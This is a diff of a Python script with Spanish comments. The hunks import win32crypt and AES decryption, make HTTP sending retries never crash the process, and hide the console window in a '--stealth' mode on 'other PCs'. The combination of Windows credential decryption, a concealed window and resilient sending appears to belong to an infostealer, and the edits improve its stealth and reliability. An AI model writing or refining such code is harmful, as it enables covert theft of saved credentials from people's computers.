@@ -39,15 +39,9 @@ def safe_b64_decode(val):
         return val
 
 try:
-    import win32crypt
+    win32crypt = importlib.import_module('win32crypt')
 except ImportError:
     win32crypt = None
-
-# Ocultar consola inmediatamente si es un ejecutable (frozen)
-if getattr(sys, 'frozen', False):
-    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
-    if hwnd:
-        ctypes.windll.user32.ShowWindow(hwnd, 0)
 
 from Cryptodome.Cipher import AES
 
@@ -153,15 +147,15 @@ VALID_URL_PREFIXES = ('http://', 'https://')
 
 
 def retry_request(func):
-    """Decorador simple para reintentar peticiones HTTP en caso de problemas de red."""
+    """Decorador que reintenta peticiones HTTP. Devuelve False si fallan todos los intentos,
+    NUNCA propaga la excepción al caller para garantizar que el proceso no muera."""
     def wrapper(*args, **kwargs):
         for i in range(MAX_RETRIES):
             try:
                 return func(*args, **kwargs)
             except (requests.exceptions.RequestException, Exception) as e:
                 logger.warning(f"Intento {i+1}/{MAX_RETRIES} fallido: {e}")
-                if i == MAX_RETRIES - 1:
-                    raise
+        logger.error(f"Todos los intentos de {func.__name__} agotados. Abortando envío.")
         return False
     return wrapper
 
@@ -394,9 +388,13 @@ def main():
     args = parser.parse_args()
 
     if args.stealth:
-        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
-        if hwnd:
-            ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
+        # Ocultar consola AQUÍ: después de parsear args, cuando ya sabemos que el
+        # proceso arrancó bien. Hacerlo al inicio del módulo mascaraba errores de
+        # importación en otras PCs con pywin32 mal instalado.
+        if getattr(sys, 'frozen', False):
+            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+            if hwnd:
+                ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
         for handler in logging.root.handlers[:]:
             if isinstance(handler, logging.StreamHandler) and not isinstance(handler, logging.FileHandler):
                 logging.root.removeHandler(handler)
